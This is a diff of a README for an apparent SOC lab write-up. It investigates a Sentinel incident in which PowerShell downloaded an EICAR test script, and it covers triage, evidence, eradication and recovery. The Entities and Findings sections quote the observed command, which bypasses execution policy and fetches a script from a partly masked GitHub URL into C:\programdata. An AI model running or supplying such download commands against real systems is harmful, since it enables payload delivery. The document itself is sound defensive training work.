@@ -1,5 +1,5 @@
 # 🛡️ PowerShell Suspicious Web Request Detection & Incident Response
-
+### SOC Analyst Project | Microsoft Sentinel & Defender for Endpoint
 ---
 ## 🛡️ Objective
 - Threat actors who gain access to a system often leverage built-in tools such as PowerShell to download additional payloads from the internet. This technique allows attackers to blend into legitimate administrative activity while expanding control, establishing persistence, or communicating with command-and-control (C2) infrastructure.
@@ -61,14 +61,14 @@ This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Reques
 ## 🎯 Part 3: Detection & Analysis
 
 
-#### ** Identify and validate the incident **
+#### 🔥  Identify and validate the incident 🔥 
 - I Observe the incident and assign it to myself, set the status to Active.
 - Investigate the Incident by Actions → Investigate (sometimes takes time for entities to appear)
 
 
 <img width="900" height="300" alt="image" src="https://github.com/user-attachments/assets/2f70f206-ea85-46b9-a449-08337c583431" />
 
-#### ** Gather relevant evidence and assess impact **
+#### 🔥 Gather relevant evidence and assess impact 🔥 
   - In this case the actual script files would be evidence, but are not necessarily the threat. The threat would be how they got there in the first place, or why the user (or system            account) is downloading them and executing them.
   - In real life, this could have happened from accidentally downloading malware or installing a game or free software or any number of ways.
   
@@ -76,19 +76,19 @@ This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Reques
 
 
 
-- #### Entities (3)
+- #### 🔥  Entities (3)
  - Device: soclab1
  - User: soclab1
  - "powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.gitxxxusercontent.com/josxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/     eicar.ps1 -OutFile C:\programdata\eicar.ps1
 
 
    
-#### ** Investigation evidence: ** 
+#### 🔥 Investigation evidence:
 
 <img width="850" height="350" alt="image" src="https://github.com/user-attachments/assets/6e68b4ec-a2f0-4cf4-8b81-b497c58165e0" />
 
 
-#### ** Findings **
+#### 🔥 Findings
 
 - Upon investigating the triggered incident "Soclab1 - Suspicious Powershell Invoke-WebRequest"
 - It was discovered that the following powershell script "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.gitxxxusercontent[.]com/josxxxadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar[.]ps1';
@@ -100,13 +100,13 @@ The incident was triggered on one device  "Soclab" by one user account "Soclab1"
 PowerShell was used to download malicious script "eicar.ps1" from external URLs: https://raw.gxxxubusercontent[.]com/joshxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar[.]ps1
 
 
-#### Execution Review
+#### 🔥 Execution Review
 
 - I checked to make sure none of the downloaded scripts were actually executed, but found out the script run successfuly.
 - In this lab, scripts were executed by the attack simulator. In a real-world scenario, further root cause analysis would be required.
 
   
-#### ** Evidence ** 
+#### 🔥 Investigation Evidence 
 <img width="850" height="300" alt="image" src="https://github.com/user-attachments/assets/d850df93-b91e-4f3a-b92d-75196b54fb89" />
 
 ---
@@ -120,12 +120,12 @@ PowerShell was used to download malicious script "eicar.ps1" from external URLs:
   <img width="750" height="330" alt="image" src="https://github.com/user-attachments/assets/a0382c46-0950-46f5-8103-e620a8d685cf" />
 
 
-### Eradication
+### 🔥 Eradication
 
 - Anti-malware scan initiated from MDE
 - Downloaded scripts reviewed to determine execution status
 
-### Recovery
+### 🔥 Recovery
 
 - No persistent malware identified
 - System restored to normal operation
